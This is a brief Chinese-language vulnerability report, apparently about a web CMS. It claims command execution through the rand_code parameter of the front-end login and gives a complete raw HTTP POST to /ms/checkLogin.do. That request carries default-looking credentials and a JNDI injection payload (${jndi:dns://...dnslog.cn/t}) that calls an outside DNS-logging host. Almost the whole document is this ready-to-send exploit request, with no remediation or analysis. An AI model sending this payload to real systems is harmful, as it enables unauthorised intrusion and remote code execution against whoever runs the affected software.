在前台登录处存在命令执行漏洞
可以通过rand_code参数进行代码执行



POST /ms/checkLogin.do HTTP/1.1
Host: 127.0.0.1:8088
Content-Length: 106
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="100"
Pragma: no-cache
sec-ch-ua-mobile: ?0
Content-Type: application/x-www-form-urlencoded
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1:8088
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8088/ms/login.do
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: pageno_cookie=1; JSESSIONID=BD34D601FC3933412466B54942B5EBEA
Connection: close
Accept: 1
User-Agent: 2
X-Client-IP: 3

managerName=msopen&managerPassword=123456&rememberMe=false&rand_code=${jndi:dns://xxxx.wputvy.dnslog.cn/t}


